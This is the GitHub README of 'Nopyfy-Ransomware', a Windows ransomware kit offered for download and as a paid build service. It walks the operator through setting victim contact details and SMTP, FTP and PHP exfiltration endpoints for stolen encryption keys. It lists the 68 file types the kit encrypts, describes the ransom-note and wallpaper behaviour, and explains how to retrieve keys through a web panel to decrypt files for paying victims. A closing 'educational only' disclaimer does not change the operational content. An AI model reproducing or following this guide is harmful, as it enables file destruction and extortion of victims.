<h1 align="center" > ]|I{•------» Nσρყϝყ-Rαɳʂσɱɯαɾҽ «------•}I|[ </h1>
<h3 align="center">ａｎ Ａｄｖａｎｃｅｄ Ｒａｎｓｏｍｗａｒｅ</h3>

<p align="center"><a target="_blank" href="https://github.com/in-future-world/Nopyfy-Ransomware">
  <img src="https://badgen.net/badge/Open%20Source%20%3F/Yes%21/blue?icon=github" />
  <img src="https://visitor-badge.glitch.me/badge?page_id=in-future-world.Nopyfy-Ransomware" />
  <img src="https://img.shields.io/github/repo-size/in-future-world/Nopyfy-Ransomware" />   
</p>

    

<p align="center">
   <img src="https://user-images.githubusercontent.com/88558310/130073189-ac650cc1-9378-4963-95ff-6aa196953371.png" />
</p>


##

# Description 
[![Ask Me Anything !](https://img.shields.io/badge/Ask%20me-anything-1abc9c.svg)](mailto:info@infutureworld.xyz) <br />
Nopyfy-Ransomware is Open source Ransomware. you can download it's source Code from above. it is similar to hidden-tear ransomware but nopyfy is a`highly-upgraded` version of hidden tear. It has more feature than hidden tear and also very easy to use beacause all things which user can fill are in one place and also Nopyfy prevent from Victim data lost by encrypt and save in localy when user are offline during attack. Nopyfy use symmetric AES algorithm to encrypt files. Nopyfy is very easy to use, Try it.




## if You not know how to build-up this Virus, Click [here](https://rzp.io/l/Nopyfy-Ransomeware).
In form, leave those feature which didn't want you. It's very simple to fill form. Try...it.</br>
Get Now - 
<a href="https://rzp.io/l/Nopyfy-Ransomeware" target="blank"><img align="center" src="https://user-images.githubusercontent.com/88558310/129912232-184e609a-9c2b-4191-917b-947eb7a0ce59.png" alt="click-here-button" height="50" width="150" /></a></br>

## Features that you will use
**Ransomware size is only `22kb`**
- AES algorithm to encrypt files
- Send encryption key by - `PHP,SMTP,Ftp`
- Save localy encrypted victim data with name user-id
- Password will encrypt by your entered password
- Get password with user-id if user offline during attack(Using `Nopyfy-information-decrypter`)
- Save generated Victim data in Your databases 
- All informations are sent if there is an internet connection and the ransomware wait for it if there isn't.  
- You can see Victim data by Webpanel and Mail and Ftp and result.txt (automatic created file in file-manager) and also in MySql database
- it can encrypt upto `68` file-type
- It now encrypts a wider variety of file types and has a changing desktop wallpaper and also create `READ_IT.txt` file with information and User-id and save it in many location 
- Nopyfy decrypter give massege for file are decrypted or not  
- Nopyfy decrypter change dekstop bacgroung after successful decryption
- By User-id, you will able to get Victim information(encryption key, ip, time, username and pc name, etc) by`Nopyfy-information-decrypter`

    
## Features Of Nopyfy for getting Victim data
- PHP Webserver (Only Php version 5.6 are supported)
- SMTP Mail
- Ftp Server(Encrypted form)
- Save localy(With encrypted password and Victim data)

## Under PHP Webserver
- MySql database
- Php mail
- Web-panel
- localy save data(in your server)

## Power Of encryption
In line 44, change `100 byte` to your desirable number. It will Change encryption key and make it trillion in one and generate 10 digit password that required for decrption and encryption of password will be done by your password that you enter(8 digit password are allowed only)



## What we input
Its very simple. For Making Nopyfy-Ransomware, You can do changes Only from `line 35 to line 102`. Follow these step -</br>
1 - Download it from above and go-to Nopyfy-Ransomware Folder</br>
2 - Open Nopyfy-Ransomware.sln in Visual Studio</br>
3 - ⚠ Warning - Only do changes in line 35 to line 102</br>
4 - In line 38(`string nop_own_name = `), write your Company name</br>
5 - In line 41(`string nop_own_email = `), write your Victim contact email</br>
6 - In line 44(`byte nop_byte = `), write you encryption last byte (Ex - 100)</br>
7 - In line 48(`string backgroundImageUrl = `), write your image url. it will change pc wallpaper after attack</br>
8 - In line 51(`string targetURL = `), write your Php webserver url</br>
9 - In line 59(`string nop_smtp = `), write your smtp hostname</br>
10 - In line 63(`string nop_smtp_from = `), write your email that send mail</br>
11 - From line 67 to 69(`string nop_smtp_to = `,`nop_smtp_to2 = `,`nop_smtp_to3 = `), write email that receive mail by `nop_smtp_from`</br>
12 - In line 73(`string nop_smtp_pass = `), write your email password that provided by hostname</br>
13 - In line 84(`string nop_ftp = `), write your Ftp hostname in second quote and folder in third quote</br>
14 - In line 88(`string nop_ftp_user = `) write your Ftp account username</br>
15 - In line 92(`string nop_ftp_pass = `) write your Ftp acount password</br>
16 - In line 99(`nop_encryption_pass = `) write only and only 8 digit password</br>



## Describing How to use All Features
- `nop_own_name =` Company name will seen by victim for his information, that this company attack on him. it will write in this format - "Nopyfy"
- `nop_own_email =` Contact email are used by victim for contacting you for paying money and decrypting his files. it will write in this format - "info@infutureworld.xyz"
- `nop_byte =` It is a last byte of encryptions salt. we also say that this is unique password for encrytion of file,so take it different and in only number formate. it will write in this format - 100
- `backgroundImageUrl =` Wallpaper of pc will change after attack, you can create wallpaper link by clicking [here](https://imgur.com/upload), it will write in this format - "https://i.imgur.com/s4MfYwB.png"
- `targetURL =` It is a server url that receive Victim information, time, password, etc. You can create this by uploading Server folder on your file manager but only PHP version 5.6 are supported. PHP webserver can create web panel and save it in MySql data base and also in .txt file on your server, he also send email. You can see victim data by just typing its web pannel url. this is highly recommended but Setup is not easy and also he does not support greater or lower than Php version 5.6. it will write in this format - "http://example.com/Server/write.php"
- `nop_smtp =` It is a Smtp hostname,it will be provided by different company's. you can also use gmail server (google hostname - smtp.google.com). it will write in this format - "smtp.example.com"
- `nop_smtp_from = ` It is email that send mail (ex - "info@infutureworld.xyz" send mail to receiver mail). it will write in this format - "info@infutureworld.xyz"
- `nop_smtp_to = ` From line 67 to 69 is email that receive sended victim data by `nop_smtp_from`.You can add more email or use only one email by leaving it. You can also use same email as `nop_smtp_from`. it will write in this format - "help.infutureworld@gmail.com" or "info@infutureworld.xyz"
- `nop_smtp_pass =` It is your email password that provided by your hostname. If you are using gmail smtp, then you also use gmail password or your can generate `app password`(app password option will show only after turning on of 2 step verification of google acount) of google acount. it will write i this format - "pnfbw0597xsp8rRj" 
- `nop_ftp = ` It is your Ftp hostname and its folder (means full url). Don't change first quote world `"ftp://"`, in second quote`"example.com"` write your hostname that provided by your hoster, in third qoute`"/Victim/"` write your folder where uploaded file save. it will write in this formate - "ftp://" + "example.com" + "/Victim/"
- `nop_ftp_user = ` It is your Ftp username that provided by your host. it will write in this formate - "infuture"
- `nop_ftp_pass = ` It is your Ftp account password that created by you or your host. it will write in this formate - "123456"
- `nop_encryption_pass =` It is encryption password that encrypt Victim data(Not file of pc, only and only victimdata). Plz note that - `take length of password "8"`, otherwise you will get error and he can't save it localy (even victim can quite instantly at the startof attack). it will write in this format - "infuture"



## How to use PHP Webserver
First create webserver. If you have domain-name then you can use bluehost.com, ionos.com,hostinger or 000webhost.com or free hosting tool awardspace.com or freehostia.com but if you not have persnoal domain then you will use this site for creating web server(gives youcustom url free) - 000webhost.com, infinityfree.net or freehostia.com (`But we recommend 000webhost.com` and for some more feature `infinityfree.net`).</br>

***Use any web server but set his php version to `5.6`***</br>

after creating web server, create subdomain or directly go-to Server folder which you download recently and Set Webpannel username and password, find `check.php` file, open it and in line 5 `$password = "test";`, replace your password with `test`, then go to  line 16 `$username == "test"`and replace with your username (If you don't change this, then default username and password is `test`).Then go to cpanel(web server) and find MySql database and open it, after that find import button and choose `import.sql` in Server Folder. After that open connect_db.php change `localhost` to provided server or leave it (if you are using same platform for creating webserver and MySql server) and in `root` to your MySql username and in `password` write your MySql password and in line 3 `my_db` change this with your database name. If you want to use php email then open write.php file and in line 47 write your email(this feature is for only those people who have persnoal domain).</br>

***After completing above setup follow these step - ***</br>

Go-to file manger of your domain and upload Server folder under domain (Ex - my domain "client.infutureworld.xyz" and after upload Server folder it will "client.infutureworld.xyz/Server"). If you follow above steps correctly then your php url will in this format `http://example.com` + `/Server/write.php`(Ex - `http://example.com/Server/write.php`)

## What Nopyfy do
First he generate password and encrypt file with symmetric AES algorithm method. List of files they encrypt - </br>
".txt", ".jar", ".exe", ".dat", ".contact" , ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd" , ".pdf" , ".dll" , ".c" , ".cs", ".mp3" , ".mp4", ".f3d" , ".dwg" , ".cpp" , ".zip" , ".rar" , ".mov" , ".rtf" , ".bmp" , ".mkv" , ".avi" , ".apk" , ".lnk" , ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj" , ".pdb", ".ico" , ".pas" , ".db" ,  ".torrent"

***You can also add extention in line 351 but don't add .ini file because it will crash pc ***</br>

during encryption Nopyfy create READ_IT.txt and write your massage(you can edit massage in line 561) and save it in many location for preventing data lost because in readme file it include encrypted victimdata with name id . After this process of sending password to our server are start. first he send Victim data to PHP server and then he send smtp mail and then he create a file with name of pc and also add some generated word(this will prevent data rewrites on fpt server file) and then he save encrypted user detail and send it to ftp server.  

## How to use Nopyfy-Decrypter
### First create application 
First open `Nopyfy-Decrypter.sln` file in `Nopyfy-Decrypter` folder and then go to line 41 and change url with your url (after successful decryption, it will change pc wallpaper) and then goto line 43`byte nop_byte = 100` and change `100` with (file - `Nopyfy-Ransomware.sln`, on line 44(`byte nop_byte = 100;`) ) ***It's important to take same byte in both file otherwise he didn't able to decrypt files*** and after all create applications file. 

### How to use
After any vitim get successfull attack,goto task manager and end process of Nopyfy or restart pc </br>
password(10 digit password) get by these method - </br>
- goto your Web pannel (ex of my pannel - client.infutureworld.xyz/Server) and type your username and password (default username and password - test) and in password collom, copy it.
- goto mail app and you will saw a mail that subject is as well as victim pc nam,open it and copy password
- goto ftp account(where you provide link in line 84) and you will see file that name as pc name and some random word, open it and copy password
- goto `Server` folder of file manager and find result.txt file, open it and copy password
- If you are using Php mail then you will also receive mail (to or from), open it and copy password
- goto MySql database and find `victim` , goto victim and copy password
- If vitim are offline on time of attack, then in encrypted form data of vitim(password, time, username, etc) are also save in all READ_IT.txt file in end of file with name id. when victim contact you, tell him for sending his id to you and then you use Nopyfy-information-decrypter for getting victim data and password. Decrypt and copy it.



## How to use Nopyfy-information-decrypter 
First open `Nopyfy-information-decrypter.exe` application in `Nopyfy-information-decrypter` folder and then in `input`, paste the User-id(`encrypted victim data`) and in `pass`, write your 8 digit password. If `input and pass` are correct then you will see popup massege and one .txt file open that contain Victim data otherwise you will get error popup message



## Compatibility
- Windows 



## Contact us

[![Gmail!](https://img.shields.io/badge/Primary-Gmail-D14836?style=&logo=gmail&logoColor=white)](mailto:info@infutureworld.xyz)
[![Gmail!](https://img.shields.io/badge/Secondary-Gmail-D14836?style=&logo=gmail&logoColor=white)](mailto:help.infutureworld@gmail.com)
[![Twitter!](https://img.shields.io/badge/Twitter-1DA1F2?style=&logo=twitter&logoColor=white)](https://twitter.com/In_future_world)
[![Instagram](https://img.shields.io/badge/Instagram-E4405F?style=&logo=instagram&logoColor=white)](https://www.instagram.com/in_future_world/)
[![YouTube](https://img.shields.io/badge/You-Tube-red?style=&logo=youtube&logoColor=red)](https://www.youtube.com/channel/UCh5_VB1guUcc0mWAOc7etrA)
[![Git Hub](https://img.shields.io/badge/Git-Hub-lightgrey?style=&logo=github&logoColor=white)](https://github.com/in-future-world)
[![Contact Us](https://img.shields.io/badge/Contact-Us-blue?style=&logo=deviantart&logoColor=white)](https://www.infutureworld.xyz/contact-us)




Primary Email: info@infutureworld.xyz <br />
Secondary Email: help.infutureworld@gmail.com <br />
Website for contacting us: https://www.infutureworld.xyz/contact-us <br />
YouTube: [In_Future_World](https://www.youtube.com/channel/UCh5_VB1guUcc0mWAOc7etrA) and [Craft Book](https://www.youtube.com/channel/UCWjay1fq6WaL_svEhQ68XMg) <br />
Instagram: [In_Future_World](https://www.instagram.com/in_future_world/) <br />
Twitter: [In_Future_World](https://twitter.com/In_future_world) <br />
GitHub: [in-future-world](https://github.com/in-future-world) <br />


## Legal Warning for Users
While this may be helpful for some, there are significant risks. Nopyfy may be used only for Educational Purposes Only. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running Nopyfy, even though you are innocent.



## MY side
***I am not responsible for any crime done by Nopyfy-Ransomware-source-code***


<br>

## Support:
<p><a href="https://www.buymeacoffee.com/infutureworld"> <img align="left" src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" height="50" width="210" alt="infutureworld" /></a></p><br>

<br>

<br>You can find me on <a target="_blank" href="https://twitter.com/in_future_world">
  <img alt="Instagram" width="22px" src="https://user-images.githubusercontent.com/88558310/129485486-5fbaa4f6-dce2-4a3d-9ad0-de09abaf1afb.png" />
</a>, or on  <a target="_blank" href="https://www.instagram.com/in_future_world">
  <img alt="Instagram" width="22px" src="https://user-images.githubusercontent.com/88558310/129485437-411924e1-b7d0-4f28-a8ca-b3886cc98e8c.png" />
</a>

